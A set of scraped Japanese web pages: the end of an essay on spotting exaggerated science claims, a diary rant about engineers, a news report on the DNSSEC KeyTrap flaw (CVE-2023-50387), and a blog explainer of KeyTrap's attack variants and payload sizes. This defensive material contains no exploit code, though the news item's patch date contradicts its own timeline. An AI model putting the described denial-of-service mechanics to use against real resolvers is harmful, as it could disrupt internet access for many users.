根拠としている論文の出典を明示していたら、それだけで、評価を上げた方がいいです。

さらに、実験条件と実験手続きを説明していたら、それだけで、大きく加点した方がいいです。

そして、根拠としている論文の出典を明示し、かつ、実験条件と実験手続きをちゃんと説明していたら、「根拠としている論文から言えないことを言っている」ことが明らかな場合でも、それは大目に見るべきです。

なぜなら、ウソであることがはっきりしているウソには、大して害がないからです。

出典と実験条件と実験手続きが書いてある場合、それを根拠にそれからは言えない主張をすれば、すぐにそれは読者に分かります。

実験条件と実験手続きを読んで、「コイツは根拠としている論文から言えないことを言っている」と鬼の首を取ったように叩いて騒ぐことは、世の中を悪くします。

「根拠としている論文から言えないことを言っているけど、出典と実験条件と実験手続きをちゃんと説明しているからエライ」と褒めた方が、はるかに世の中は良くなります。

そして、「根拠としている論文の出典が書いてないから怪しい」「実験条件と実験手続きが書いてないから怪しい」ということは、積極的に言っていった方が、世の中は良くなるのです。

出典を表示しない記述が多い本に対しては、Amazonレビューでも「出典が書かれていないものが多いので、信憑性が怪しい」というコメントをつけて、☆の評価も下げるべきです。

また、それは、単に世の中を良くするというだけでなく、自分個人の得でもあります。

「出典・実験条件・実験手続き・実験データを明らかにしているものほど信用度が高い」という判断基準を持っていれば、ズレていて、雑で、過度な一般化をやっていて、象の足だけ見ていて、チェリー・ピッキングで、確証バイアスゾンビな主張に騙される頻度を大きく減らすことができるのですから。





実験条件

二つ目の対策は、「実験条件を少し変えたらどうなるか？」を吟味してみることです。

たとえば、以前、「○○というコンテンツが超大ヒットしたのは偶然である」という主張の根拠にダンカン・ワッツ博士らの行った「ミュージックラボ」の実験(2006年)を紹介した方がいらっしゃいました。

その実験の概要は、以下のようになります：

実験はWebサイトで行われました。

1万4341人の被験者が参加したその実験では、未知のバンドの未知の曲が48曲サーバに登録されています。

そのサイトにやってきた被験者は、到着しだい、２つのグループのいずれかに、ランダムに振り分けられました。

どちらのグループでも、被験者は、それらの曲を聴いて、五段階評価(☆１(嫌い)～☆５(好き))し、望むならダウンロードするように依頼されました。

２つのグループの違いは、曲名の横にダウンロード数が表示されるかどうかです。

ダウンロード数表示ありの被験者グループは、さらに８つのグループに分けられました。

曲名の横に表示されているダウンロード数は、それまでに到着した同じグループの被験者によってダウンロードされた数です。

実験は、二回行われました。

実験１では、ランキングなし。曲の並び順は、被験者ごとにランダムです。

実験２では、ランキングあり。ダウンロード数が表示されるグループでは、ダウンロード数の多い順に曲が縦に並んでいます。

結果はどうなったか？

ダウンロード数表示ありの８つのグループで、どの曲がヒットしたかは大きく異なりました。

もちろん、質がすごく良い曲は多くのグループで上位になり、質がすごく悪い曲は多くのグループで下位になりました。

(質の良し悪しは、ダウンロード数非表示のグループの評価で決めている)

でも、それ以外の大多数の曲は、ヒットするかどうかは、ほぼランダムだったのです。

なぜこうなったのでしょうか？

「被験者は、ダウンロード数が多い曲やランキング上位の曲をダウンロードする傾向にあった」という点が鍵です。

そのため、初期に、偶然、ダウンロード数が多くなった曲があると、その曲はますますダウンロード数が増え、雪だるま式にダウンロードが増えて、それがヒット曲になったのです。

つまり、「初期に、偶然、小さな偏りができる → ダウンロード数表示やランキングによってその偏りが拡大する → ヒットが生まれる」という作用機序で、主に偶然によって、ヒットするかどうかが決まったのです。

この結果を見ると「コンテンツがヒットするのは偶然である」と言えるような気がします。

しかし、もし、これが「未知のバンドの未知の曲が48曲」ではなく、「有名バンドの未発表曲4つ + 有名バンドの未発表曲だと偽った無名バンドの曲４つ ＋ 未知のバンドの曲40曲」で、「作者名表示、非表示」×「ダウンロード数表示、非表示」×「ランキング表示、非表示」のマトリクスで被験者がグループ分けされていたら？

「初期に、知名度の違いによって、小さな偏りができる → ダウンロード数表示とランキングによってその偏りが拡大する → ヒットが生まれる」

という作用機序で、主に知名度の違いによって、ヒットするかどうかが決まっていたかもしれません。

また、「種の飛躍」の問題もあります。

「マウスで得られた結果の90%は、最終的に人間には適用されない」のと同じ話で、曲以外の種類のコンテンツを使ったら、別の実験結果になった可能性も考えられます。

たとえば、Web小説だと、「初期の小さな偏り」に影響を与えられそうなコントロール可能な変数は、タイトル、アイキャッチ画像、ランディングページの作品概要、小説冒頭の挿絵、小説冒頭の数十行、フォロワー数、作者のブランド、作品コンセプト、キャラ、ストーリー、演出、クライマックス、エンディング、文章の上手さ、などなど、たくさんあります。

それら全てをあわせても、「初期の小さな偏り」に与える影響は「偶然のゆらぎ」よりも小さいでしょうか？

あるいは、マンガ、アニメ、TVドラマ、映画だったら？

そもそも、あなたは、なぜ、今、この文章を読んでいるのでしょうか？

私が１８年間ブログを書き続けた結果、いろんなものが溜まった → それがこの記事の「初期の小さな偏り」に影響した → その偏りをXのリツイート数表示といいね数表示が拡大 → この記事が拡散 → あなたのところに届いた

からではないでしょうか。

この記事の「初期の小さな偏り」に影響を与えた要因には、「偶然のゆらぎ」もあるでしょうが、「１８年間の積み重ね」などの必然的な要因を全て足し合わせたものの方が大きかったのではないでしょうか。

あの実験で「初期の小さな偏り」が主に偶然で決まったのは、単に、「偶然のゆらぎ」以外の要因が強く出ないように実験条件を設定したからにすぎないのではないでしょうか？

実験条件は、実験者が恣意的に決めるものです。「初期の小さな偏り」が主に偶然で決まるような実験条件にすれば主に偶然で決まるし、主に必然で決まるようにすれば主に必然で決まる、ただそれだけのことかもしれません。

偶然によって決まるかどうかは、少しずつ実験条件の異なるたくさんの実験をやってはじめてわかることであって、この実験一つだけでは、象の足の一つに触った程度しかないのです。

そう考えると、ミュージックラボの実験は「○○というコンテンツが超大ヒットしたのは偶然である」という主張の根拠として使えるようなものじゃないことが分かります。

これは、その主張が正しいかどうかとは別の話です。仮にその主張が正しかったとしても、その実験は、その主張の根拠としては使えないのです。

なので、「○○というコンテンツが超大ヒットしたのは偶然である」は、「根拠としている論文からは言えない主張」なのです。

以上のような吟味が、論文を読めない人でも可能だという点が、非常に重要です。

動画/ブログ記事の中に実験条件・実験手続きが書かれていれば、「実験条件を少し変えたらどうなるか？」という疑問を持つだけで、「根拠としている実験から言えることを主張しているか？」を吟味することができるのです。

「透明性」の価値がいかに高いかが分かります。

実験を根拠に「テキストの再読は非効率」という主張をする人がいた場合も、同様です。

もし、動画/ブログ記事/本の中に実験条件・実験手続きが書かれていれば、「実験条件を少し変えたら、テキストの再読は非効率になっただろうか？」と考えるだけで、「テキストの再読は非効率」という雑な主張には騙されなくなります。

科学的根拠があることをウリにする人たちが、出典を隠し、実験条件・実験手続きも説明しないことが多い理由の一つが、これなのです。





まとめ

目印のやる夫



まとめると、以下の２つの簡単な対策で、インチキ論文やインチキYouTuber/ブロガー/作家に騙されにくくなります。

〔透明性〕 透明度の低い研究は話1/10に聞く。

〔実験条件〕 実験条件を少し変えたらどうなるか？を吟味する。





以上です。

こんな長文を、ここまで読んでいただき、ありがとうございました。





この記事の作者(ふろむだ)のツイッターはこちら。









この記事を面白いと思った人が面白いと思いそうな同じ作者の記事



エビングハウスの忘却曲線の実験を根拠にした勉強法がインチキである理由を丁寧に説明する

「行動経済学は死んだ」騒動のメモ

ChatGPTのウソ回答に騙されない方法

最新研究からわかる 学習効率の高め方

人生は、運よりも実力よりも「勘違いさせる力」で決まっている









※この記事は、文章力クラブのみなさんにレビューしていただき、ご指摘・改良案・アイデア等を取り込んで書かれたものです。
Title: 科学的発見が誇張→曲解→誤解→蔓延するメカニズムの図解と簡単で効果抜群の2つの対策｜ふろむだ@分裂勘違い君劇場

Link: https://anond.hatelabo.jp/20240218192624
Content: ■ 引く手数多そうなエンジニアがムカつく

他に行く当てなんていくらでもありますよとでも言わんばかりの態度がムカつく。

はいはい正論ですよ、転職副業あたりまえ終身雇用絵空事。

でもさ、会社に来てるんなら会社に参加しなよ。

何のアイデアも「難しいですね」「技術的には可能ですが」「そもそも要ります？」

なんかさ、気概が感じられんのよ。

内心なんてわかりっこないけどさ。

会社の事業とか理念とか関係ない、どうせ転職するまでのつなぎ、私は何も困りません、みたいにさ、見えちゃうのよ。

泥臭くてもやらなきゃいけないときもあるじゃん。

実現したいときもあるじゃん。

何でそんな事なかれ主義なんだろう。

そんなに優秀で、ありとあらゆる技術を手足のように使いこなして、なんで志がないんだろう。

お金とか見返りとかキャリアとかポートフォリオとか。

自分、自分、自分、メリット、メリット、メリット。

ちょっともう、うんざりしちゃうよ。

ハッキリ言って。

これはN=1の自分語りだけどさ、みんなも思い当たるところあるんじゃないの？

考え直してくれ。

ツイートシェア
Title: 引く手数多そうなエンジニアがムカつく

Link: https://www.itmedia.co.jp/enterprise/articles/2402/19/news054.html
Content: ドイツの国立応用サイバーセキュリティ研究センターATHENEは2024年2月13日（現地時間、以下同）、DNSSEC（ドメインネームシステムのセキュリティ拡張機能）の設計に重大な欠陥「KeyTrap」を発見したと発表した。

ATHENEによると、KeyTrapを悪用した場合、単一のDNSパケットが結果的にCPUの使い果たしを誘導し、「Google Public DNS」やCloudflareのDNSなど広く使われているDNS実装やパブリックDNSプロバイダーを全て停止させることが可能だ。発表によると「BIND 9」を16時間ダウンさせたとされている。なお、この欠陥は「CVE-2023-50387」として特定されている。

この攻撃はインターネットの基本的な機能に深刻な影響を与え、世界中のWebクライアントの大部分が利用不能になる可能性がある。主要なDNSベンダーはこの攻撃を「これまでに発見されたDNSに対する最悪の攻撃」と呼んでおり、状況の重大さが指摘されている。

KeyTrapを悪用するサイバー攻撃者は、DNSSECを検証するDNSリゾルバを利用する全てのシステムにおいて、インターネットアクセスを無効できるとされている。

2023年12月には全世界のWebクライアントの31.47％がDNSSECを検証するDNSリゾルバを使用している。つまり、この攻撃が実行されるとWebブラウジングや電子メール、インスタントメッセージなどの技術が利用できなくなり、インターネットを利用するアプリケーションに深刻な影響が及ぶ可能性がある。

発表によると、研究者らは数カ月にわたって全ての関連ベンダーや主要なパブリックDNSプロバイダーと協力してベンダー固有のパッチを作成してきた。最後のパッチは2023年2月13日に公開されている。ATHENEはDNSサービスを提供する全てのプロバイダーに対してこの脆弱性の影響を軽減するために、パッチを迅速に適用することを強く推奨している。

KeyTrapで悪用されている脆弱性の要件は、1999年に廃止されたDNSセキュリティ拡張の標準仕様である「RFC 2535」から既に存在していた。2012年にこの脆弱性はDNSSEC検証の実装要件である「RFC 6781」と「RFC 6840」にも持ち込まれた。発表によると、この脆弱性は少なくとも2000年8月からBIND9 DNSリゾルバに存在し、2007年8月にはDNSリゾルバ「Unbound」のコードに組み込まれていたとされている。

ATHENEは「KeyTrapはソフトウェア実装のバグではなくDNSSECの設計思想に関連した根本的な問題であるため、抜本的な解決は簡単ではない」と説明している。研究チームは主要ベンダーと協力して問題の軽減に取り組んでいるが、攻撃を完全に防ぐにはDNSSEC標準を改訂するなどしてDNSSECの設計思想を根本から考え直すことが必要だと指摘した。
Title: 「DNSに対する最悪の攻撃」　DNSSEC設計の根幹に関わる脆弱性「KeyTrap」が見つかる

Link: https://knqyf263.hatenablog.com/entry/2024/02/19/155658
Content: DNSは趣味でやっているだけですし有識者のレビューを経ているわけでもないので誤りを含むかもしれませんが、DNS界隈には優しい人しかいないのできっと丁寧に指摘してくれるはずです。

要約

ATHENE、ドイツの国立応用サイバーセキュリティ研究センターは、DNSSEC（ドメインネームシステムセキュリティ拡張）に関する重大な設計上の欠陥を発見しました。この欠陥は、DNSSECを検証するDNS実装と公開DNSプロバイダーに大きな影響を与える可能性があります。彼らは「KeyTrap」と名付けた新しい攻撃クラスを開発し、単一のDNSパケットを使用して広範囲にわたるDNS実装と公開DNSプロバイダーを中断させることができることを示しました。この攻撃は、インターネットを使用するあらゆるアプリケーションに深刻な影響を与える可能性があり、ウェブブラウジング、電子メール、インスタントメッセージングの利用不能を引き起こすことができます。この欠陥はDNSの基本的な設計哲学に根ざしており、完全には修正が困難です。すべてのDNSサービスプロバイダーに対し、この重大な脆弱性を軽減するために直ちにパッチを適用することが強く推奨されています​​​​。

この文はChatGPTによる要約でしたが改めて自分の言葉で説明しておくと、DNSSECの設計に問題が見つかりCVE-2023-50387が採番されました。この脆弱性を悪用すると多くのDNSリゾルバーに容易にDoSを引き起こすことが出来ます。主要なDNSベンダーはKeyTrapを「これまでに発見されたDNSに対する最悪の攻撃」と呼んでいるぐらいです。実際に試してみましたが特別な攻撃条件は不要で1クエリで応答不能状態に出来ます（マルチスレッドの場合は複数クエリ必要）。DNSSECの検証時の脆弱性なので、権威サーバには影響しません。

このあと詳細は説明しますが、攻撃の原理も簡単で公開されたテクニカルレポートを読めば誰でも攻撃可能です。つまり攻撃コードは公開されているに等しいです。最悪と評されるぐらいの脆弱性ですし、DNSリゾルバーを運用している会社や組織は速やかに修正パッチを適用する必要がありそうです。

ここから先は例によってやたら長いのでKeyTrapの詳細に興味がない人は読む必要はありません。

背景

2024年2月13日頃、BINDから7つの脆弱性の修正が公開されました。

lists.isc.org

この中のCVE-2023-50387だけ"KeyTrap"と脆弱性に名前がついていて凄そうと思っていたのですが、その後ISCから技術的な解説が公開されました。

www.isc.org

What is the KeyTrap vulnerability? のところを読むと以下のように書いてあります（ChatGPT訳）。

KeyTrap脆弱性については、攻撃者が多数のDNSKEYおよびRRSIGレコードを含むDNSゾーンを作成し、標準準拠のDNSSECバリデータが一致して検証する一組の組み合わせを見つけることを期待して、可能なDNSKEYおよびRRSIGレコードの全ての組み合わせを試みます。バリデータが実行する作業量に明確な制限を設けていない場合、無駄な作業に膨大なリソースを費やすことになります。この攻撃は非対称的で、攻撃者は比較的少ない労力でリゾルバに多大な労力を強いることができます。 特に古いバージョンのBINDに対してこの攻撃は極めて効果的で、DNSSEC検証は歴史的にほぼすべての処理と同じスレッドで行われていました。BINDのこの設計上の欠陥と、検証のための無制限の努力が組み合わさり、攻撃者がBINDのクエリ処理を長時間ブロックすることを可能にしました。これは遅いCPUでは数分またはおそらく数時間にも及ぶことがあります。

これを読むとあまりにもシンプルで驚くと思います。要は大量の公開鍵と大量の署名をレスポンスとして送りつけると、リゾルバーは全ての組み合わせを試そうとするので処理に時間がかかる、以上！という内容です。この時点ではATHENEから論文などは公開されていなかったのですが、正直これだけで攻撃可能なぐらいだと思います。

その後、2月16日に公式ページが作られテクニカルレポートも公開されました。

www.athene-center.de

KeyTrapの詳細に興味があったのでテクニカルレポートに目を通しました。細かく説明されているものの、やはり鍵と署名が多いと処理に時間がかかって応答不能になる、というのが内容のほとんどでした。これだけシンプルな問題が25年ぐらい気付かれないというのも興味深いですね（ DNSSECあまり使われてないのでは ）。

私たちは、上記で説明された結び付けプロセスの仕様の弱点を利用してKeyTrapアルゴリズム複雑性攻撃を開発し、単一のキータグtkに従うkの基数を持つDNSKEYセットを偽造し、これらのDNSKEYを参照する大量の無効なRRSIGレコードsを作成します。その結果、リゾルバはすべてのs署名をすべてのkキーに対してチェックする必要があります – これはO(n2)の漸近的複雑さを持つ手続きです。

話はそれますが、こういうシンプルな発見でも”SigJam（署名を大量に返す）”、”LockCram（鍵を大量に返す）”、"KeySigTrap（署名と鍵を大量に返す）"、などと順序立てて説明したり、どのアルゴリズムが特に時間がかかるのかなどを計測して比較したりして一つの体系的なレポートに仕上げており、研究者のこういうスキルはやはり凄いなと感じました。誤解のないように断っておきますが、シンプルな発見と書いているのは簡単に見つかるはずという意味ではないです。動作原理がシンプルという意味です。25年も見つかっていなかった問題を見つけるのはやはり難しいです。

度々自分への戒めとしてブログに書いているのですが、「あーはいはいそういうことね。過去の経験と知識から手を動かさずとも結果が予測できますわ。」で終わるようになると老人会入りだと思っています。知識として知っていることと実際にそれを出来ることは大きな隔たりがあるので、今回もDNSSECの環境を作ってこの脆弱性を手元で再現しました。その辺の再現方法を踏まえつつ詳細を解説します。

仕事はDNSと全く関係なく趣味なので正直踏み込んだ内容を書くのは怖いですが、よく分からないけど問題ないだろうと放置されたり、「これまでに発見されたDNSに対する最悪の攻撃」という謳い文句で不必要に恐れたり、といったことがないようにレポート公開後に急いで書きました。KeyTrapの脅威を正しく評価しようということで、自分の理解した範囲で説明します。間違いがないように最大限努めていますが、深夜に書いているのもあって不安です。何かおかしな箇所を見つけたら教えて下さい。

詳細

基本的にテクニカルレポートから引用して説明していくので、正確に知りたい人はそちらを読んだほうが良いです。単にレポートの内容を翻訳するだけだとあまり価値がないので、自分で手を動かした後半の検証部分を手厚く書いています。ここではChatGPTの翻訳をベースに自分の言葉で少し補足しています。

DNSSECとは？

DNSSEC [RFC4033-4035]では、電子署名を使ってデータの出自の認証と完全性の検証を行います。ドメイン所有者は自分のドメイン内のレコードに電子署名を行い、DNSSECに署名されたDNSレスポンスを返します。DNSリゾルバーは受信したDNSレコードを電子署名と照合して検証する必要があります。公開鍵を検証するために、リゾルバーはルートゾーンから対象ドメインまでの検証パスを構築します。

これは信頼の連鎖と呼ばれますが、今回の脆弱性にはそこまで関係ないので説明は省きます。基本はSSL/TLS証明書と同じです。

署名検証に失敗した場合、リゾルバーは不正なレコードをクライアントに配信せず、代わりにSERVFAILレスポンスを送信することでエラーを通知する必要があります。DNSSECの検証が成功した場合、リゾルバは要求されたレコードをクライアントに返し、キャッシュします。 DNSSECの署名はRRSIGタイプのDNSレコードで伝達されます。RRSIGレコードは、それがカバーするレコードのセット（RRset）と名前、クラス、およびRRSIG固有のレコードフィールドによって示されるレコードタイプに関連付けられます。

と説明されてもわからないと思うので、実際にどのようなデータが返ってくるのか jprs.jp を例に見てみます。

$ dig +dnssec +noall +ans @1.1.1.1 jprs.jp jprs.jp. 300 IN A 117.104.133.164 jprs.jp. 300 IN RRSIG A 8 2 300 20240316023003 20240215023003 2031 jprs.jp. BTakiDSqF4+NAfOo9YgEIMHHf5emwMsjn3+h7X/JItfIXKoTb868SW5Z QCAPKzJE/St7HM6nzNQOEtUe977p4ae+Wk4ZzivEaKf9qHQs5SZI3teq CfsOpEfGBVmvtH+/pJjCfLkLh17FaSa4h13jmg4X0L+Pa1FD6OT9NoOa 7e0=

通常返ってくるAリソースレコード（以下、リソースレコードは単にレコードと呼ぶ場合もある）に加え、RRSIGレコードが返ってきているのが分かります。これがこのAレコードの署名です。

署名を検証するために使用される公開鍵は、DNSKEYタイプのレコードで送信されます。これも実際に見てみます。

$ dig +dnssec +noall +ans @1.1.1.1 jprs.jp dnskey jprs.jp. 86400 IN DNSKEY 256 3 8 AwEAAb/y+kOCvdNT1lWv/ckqxHQR5LX5aOW6l0GfJApTJF8TzTDWQ+Tq 7B941jPxv/K8Mmmp0eMxvBvff9fRqinCrvHQHYVjE1fdXOGUbpJVzVbp wsHlwdlA7xK5KlTtpzoFFLyYEmPjJTrF5RQtT4YxrMv24DB8dZWrfMcF rbP1MjWt jprs.jp. 86400 IN DNSKEY 257 3 8 AwEAAcJCYBap4fADKiRhW/jQaramtRKuCwLJKBHwYarxo4jDRk1UOQ2Y LJfVUyLZKTgGNESnxOEiD6PJLBPqNFcF4jTjuPDVxeQ47A2p3sbXoejJ 9o8VMTvY+3BMFnMRwdrqV+HbSIlW6bLHLTANZltmEpF62kquPN6Ifm/W gzxPLWxhhAEKX7umhf4o1h9Nn5S/6HrI6puotdmSKk7Hdyu0pkt9wOi4 DyZ+p/qMCg/SbVTAW5O4sscwzvltUd93n0OIcpPiesMx5rVwesJ8rmHY pi2+5nxOjfa6tLCUHaFy1M+ANhWxcpeQaVI61XgjMk3a67iw3NbtH1Yc Bb3eBP2kCQU= jprs.jp. 86400 IN RRSIG DNSKEY 8 2 86400 20240316023003 20240215023003 58789 jprs.jp. M0H13AYuNPZ0Zs/TP2y9goc6Wfy2g5f7PzIJ/IAHllZE2nFJflxmbd+X HFHNDW3iA0RZCjCIpS8CZ+PM75uBrM+3cV5mjuJxBHKjT7UCQWSUHq1v 41z7jCA1R6UduX0c/oqimYY9ZEs86BKrQTQYezr3WtqPCeTIsyksu1vL mzs8UYj+yrHDjPfSrIOv93ZPO763/9EF9SoYCA/zVaREdOccM1QB1gND WBFTyGhQ4OS3RbvWZEYZlaIvj4GIB9kTACmM8wM+seRpoUidZDIz33Hl SFAdfZhizg9F5IAG+o6jJa4ClxL0Uobq0x4YV9oxXhhaVwJ5OOVlXEoM vwb+hA==

２つの鍵が返ってきています。これはゾーン署名鍵（ZSK）と鍵署名鍵（KSK）になりますが、信頼の連鎖の説明が必要になってしまいますし、これも今回そこまで関係ないので省略します。また、DNSKEYレコードに対する署名もRRSIGレコードとして返ってきています。これは後ほど検証時にもう少し説明します。とりあえずフラグが256の方がZSKと呼ばれるもので実際のレコードの署名に使われてるんだな、ぐらい知っておけば今回の説明は理解できると思います。詳しく知りたい方は本を読みましょう。

www.sbcr.jp

また手を動かすと理解が深まるので以下の記事もおすすめです。具体的にDNSKEY/RRSIGレコードがどういうフォーマットになっているか、などは以下で解説されているのでこの記事では説明しません。

eng-blog.iij.ad.jp

DNSSECの可用性

DNSSECの設計では可用性が重要な懸念事項です。可用性を確保するために、DNSSECはポステルの法則（RFC1122）に従い、「送信するものに関しては厳密に、受信するものに関しては寛容に」としています。したがって、ネームサーバーは、リソースレコードセット（RRSet）に対して一致する鍵を一つだけ送るのではなく、サポートしている全ての暗号に対する全ての鍵と、それに対応する全ての署名を送信すべきです。これにより、DNSSECの鍵が誤って設定されていたり、間違っていたり、サポートされていない暗号に対応していたとしても、検証が成功し、したがって可用性が確保されます。

DNSSECではポステルの法則に従っていることが説明されています。

検証するDNSリゾルバーが可能な全ての鍵を試すことを要求し[RFC4035]、可能な全ての署名を試すことも強く推奨します[RFC6840]。

仕様で全ての鍵と署名の組み合わせを試すことが推奨されています。そのため、多数の鍵と署名が返された場合、仕様に忠実なDNSリゾルバーではそれら全てを試します。その結果、DNSリゾルバーでDoSが起こります。

なぜ複数の鍵が許されているのか、というと例えばキーロールオーバーや複数アルゴリズムサポートのためです[RFC6781]。古い鍵を新しい鍵に入れ替える際など、新しい鍵で署名を追加し古い署名を保持し、新しい鍵が伝播するまで全てのリゾルバーに対して署名が有効であることを保証します。

鍵タグの衝突

実は厳密にはDNSKEYレコードとして応答された鍵を全て試すわけではありません。

上に書いてあるように(ゾーン名、アルゴリズム、キータグ)の3つが一致する鍵だけを使います。ですが、アルゴリズムは同じアルゴリズムで生成されたすべての鍵に対して同一です。さらにゾーン名も同じゾーンであれば同一です。つまり、主に鍵タグによって署名に使われた鍵を判別しています。

鍵タグは鍵ビットに対する疑似ランダムな算術関数を用いて計算されます。上の jprs.jp の例だと鍵タグは2031になっています。この計算方法は上で貼ったIIJさんのブログで説明されていますが、2バイトの数値なので鍵タグの衝突はまれですが自然に発生します。これは[RFC4034]に明示的に記述されており、鍵タグが一意の識別子ではないことを強調しています。鍵タグが衝突するとリゾルバーが効率的に適切な鍵を特定できなくなり、利用可能な全ての鍵での検証を行わなければならず、署名検証に大きな労力を要します。

今回の発見はかなりシンプルなものですが、こういう細かい仕様の問題を積み重ねて一つの大きな問題になったという感じがします。

攻撃内容

もう十分理解できたと思うので改めて説明するようなものではない気もしますが、一応レポートの内容をもう少し書いておきます。

攻撃は、ターゲットリゾルバー、悪意のあるネームサーバー、およびKeyTrap攻撃ベクターをエンコードするゾーンファイルへのクエリを送信するモジュールで構成されます。標準要件のアルゴリズム複雑性の脆弱性を利用して、KeySigTrap、SigJam、LockCram、およびHashTrapの異なるバリアントのKeyTrapリソース枯渇攻撃を開発します。攻撃を開始するため、攻撃者は被害者のリゾルバーに自分の悪意のあるドメイン内のレコードを検索させます。攻撃者のネームサーバーは、特定の攻撃ベクターとゾーン構成に従って、DNSクエリに対して悪意のあるレコードセット（RRsets）で応答します。

機械的な翻訳で若干わかりにくいので図を書いておきます。

攻撃ベクターは、敵によって制御されるドメインのゾーンファイルにエンコードされています。このゾーンには、DNSSECと無害なDNSレコードの両方が含まれています。攻撃を効果的にするために、敵は署名された親の下でドメインを登録する必要があります。

リゾルバーにDNSクエリを送りつけて攻撃者の管理するゾーンに問い合わせを行わせることで攻撃をトリガーします。そして攻撃者の管理する権威サーバーから不正なリソースレコードセットを返します。DNSSECの検証は元々重たい処理ですが、それを何度も行わせることでリゾルバーが応答不能になります。

上の翻訳に書いてありますが、KeyTrapはKeySigTrap、SigJam、LockCram、およびHashTrapの4つの異なる種類のリソース枯渇攻撃を含みます。

SigJam （単一の鍵 x 多数の署名）

RFCは、リゾルバがDNSKEYで検証可能な署名が見つかるまで全ての署名を試すべきであると助言しています。これを利用して、同じDNSSECキーを指す多数の署名を使用した攻撃を構築することができます。最も影響力のあるアルゴリズムを使用して、攻撃者は1つのDNSレスポンスに340の署名を収めることができ、これによりリゾルバはクライアントにSERVFAILレスポンスを返すまでの解決プロセス中に340の署名検証操作を行うことになります。SigJam攻撃は、リゾルバに1つのDNSキーを使用してDNSレコード上の多数の無効な署名を検証させることによって構築されます。

これは特に難しいことはなく、書いてあるとおりです。RRSIGレコードに大量の無効な署名が含まれている場合、リゾルバーは全てを検証しようとするためCPU負荷が高まるというだけです。

LockCram（多数の鍵 x 単一の署名）

SigJamの設計に従い、我々はLockCramと名付けた攻撃ベクターを開発しました。これは、リゾルバーが署名に利用可能な全ての鍵を[RFC4035]により検証するまで試すことが義務付けられている事実を悪用します。LockCram攻撃は、多数のZSK DNSSEC鍵を使用してDNSレコードに対する一つの署名を検証させることによって構築されます。 これに対し、攻撃者はゾーン内に複数のDNS鍵を配置し、それらをすべて同じ三つ組（名前、アルゴリズム、鍵タグ）を使用して署名レコードが参照するようにします。これは、リゾルバーが同一のDNSKEYレコードを重複排除でき、その鍵タグが等しくなければならないため、些細なことではありません。ゾーンからDNSレコードを認証しようとするリゾルバーは、その署名を検証しようと試みます。これを達成するために、リゾルバーは署名の検証に必要な全てのDNSSEC鍵を特定し、正しく構築されていれば同じ鍵タグに適合します。RFC準拠のリゾルバーは、無効な署名によって参照される全ての鍵を試し、署名が無効であると結論付けるまで、数多くの高価な公開鍵暗号演算をリゾルバーで行わなければなりません。

上の"鍵タグの衝突"の部分で説明しましたが、ここだけほんの少しだけ攻撃側が頑張る必要があります。署名検証に使われる鍵は鍵タグにより特定を行いますが、この鍵タグが等しくなるような鍵を多数用意してDNSKEYレコードとして返すことで、これらすべての鍵を使って検証を行わせることが出来ます。

KeySigTrap（多数の鍵 x 多数の署名）

これがこのKeyTrapという一連の脆弱性のメインです。なので厳密にはKeyTrapよりKeySigTrapと呼ぶべきな感じがありますが、何にせよSigJamとLockCramを組み合わせただけです。多数の署名と多数の衝突する鍵を用意したゾーンを作成し、そこのゾーンに対して問い合わせを行わせる攻撃です。

HashTrap（多数の鍵 x 多数のハッシュ計算）

KeySigTrap以外の攻撃として多数のハッシュ計算を行わせる攻撃についても解説がされていますが、署名検証のほうが計算量が多く効果的なのでKeySigTrapだけ分かっておけば一旦十分だと思います。実際には後半でKeyTrapは防げてもHashTrapは防げない緩和策なども紹介されているので詳しく知りたい人はレポートをどうぞ。

攻撃の評価

どのように攻撃を評価したのかがレポートでは詳細に説明されていますが、ここでは自分が特に重要だと思う部分だけ抜き出しておきます。

まず、主要なDNS実装が影響を受けることが述べられています。

実験的な評価を通じて、私たちのデータセット上のすべての主要なDNS実装がKeyTrap攻撃に対して脆弱であることを発見しました

また、DNSはUDPとTCPに対応していますがTCPを使った場合は2オクテットでサイズを表現するため、DNSペイロードの上限は65,535バイトになります。これは1クエリ内に含むことの出来る署名数や鍵の数に影響します。

DNS応答は通常、UDP経由で配信されます。DNS応答が大きすぎる場合、例えばEDNS(0) OPTヘッダーのEDNSサイズを超える場合、ネームサーバーはフラグメンテーションを避けるためにTCPにフォールバックします。私たちの攻撃はUDPまたはTCPのいずれかを介して実装することができます。リゾルバと私たちのネームサーバー間のトランスポートプロトコルとしてTCPを実装します。TCP上で送信されるDNSメッセージの最大サイズは、[RFC1035]によって指示されており、TCP上のDNSメッセージにはメッセージの前に2オクテットのサイズの長さ値が付けられなければならないと述べられています。このフィールドのサイズ制限の結果、ネームサーバーからリゾルバへの応答で送信されるDNSペイロードは、最大で216 = 65536バイトのサイズを持つことができます。最大伝送単位（MTU）に応じて、このペイロードは1つ以上のTCPセグメントで送信されます。したがって、DNS応答の攻撃ペイロード（すなわち、DNS/DNSSECレコード）は65Kバイトに制限されます。

DNSSECでサポートされているアルゴリズムではRSAベースよりECCベースの方が高い負荷を示したので、より攻撃的に効果的であることが分かったと述べています。

DNSSECは一般に、RSAベースと楕円曲線暗号（ECC）ベースの2種類のアルゴリズムスイートをサポートしています。私たちは両方のスイートを評価し、ECCベースの暗号アルゴリズムがRSAベースのアルゴリズムよりも大幅に高い負荷を示し、RSAを桁違いに上回ることを発見しました。

その中でも特にECDSA Curve P-384/SHA-384（アルゴリズム番号14）の負荷が一番高かったとのことです。

表は、すべてのリゾルバがアルゴリズム14 ECDSA Curve P-384/SHA-384で作成された署名の検証に最も長い時間を要することを示しています。したがって、アルゴリズム14は、利用可能な最大バッファサイズで全リゾルバに対する攻撃に最も適しており、最大の影響を与えます。

以下の表を見ると確かにアルゴリズム番号14が一番時間がかかっていますが、それ以上にBINDが軍を抜いています。さすが僕たちのBIND。

"The KeyTrap Denial-of-Service Algorithmic Complexity Attacks on DNS Version: January 2024" Table Ⅲより引用

上述したように65,535バイトがDNSペイロードの上限なので、最大で589の鍵をDNSKEYリソースレコードとして応答できます。署名は519までRRSECリソースレコードとして含められます。

アルゴリズム14の384ビット鍵サイズを使用し、鍵を輸送する理論上の最小サイズのDNSメッセージを構築することで、攻撃者は1つのDNSメッセージに最大で589の衝突するDNS鍵を適合させることができます。同様に、最小のDNSオーバーヘッドを使用して、攻撃者は1つのDNSメッセージに最大で519の署名を適合させることができます。 したがって、アルゴリズム14を使用した1つの解決要求で、攻撃者は理論的に589*519 = 305691の署名検証をDNSリゾルバで引き起こすことができ、リゾルバにかなりの処理労力を要求します。

